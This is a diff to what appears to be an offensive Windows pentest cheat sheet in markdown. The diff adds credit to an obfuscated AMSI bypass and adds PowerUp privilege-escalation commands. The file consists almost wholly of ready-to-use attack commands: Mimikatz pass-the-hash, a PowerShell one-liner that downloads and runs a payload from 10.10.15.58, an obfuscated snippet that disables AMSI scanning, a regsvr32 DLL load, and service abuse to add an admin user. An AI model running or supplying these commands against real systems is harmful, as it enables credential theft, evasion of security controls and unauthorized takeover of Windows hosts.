@@ -67,7 +67,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:xyz.local /ntlm:ce0
 powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.58/payload.ps1')
 ```
 
-## AMSI Bypass
+## AMSI Bypass - Credit to Nikhil Mittal (PTAcademy)
 
 ```Powershell
 sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
@@ -127,6 +127,16 @@ regsvr32 /s /u .\exploit.dll
 ```cmd
 Net1 localgroup administrators
 Net1 users
+```
+
+## The Invoke-AllChecks module runs all current checks for Windows privesc vectors (part of PowerUp) - Not OPsec Safe
+```Powershell
+Invoke-AllChecks
+```
+
+## Calling Invoke-ServiceAbuse (part of PowerUp) to add hexninja (replace this with your username) as admin user
+```Powershell
+Invoke-ServiceAbuse -Name 'VulService' -UserName hexninja
 ```
 
 ## Where utility to search for config files and everything 
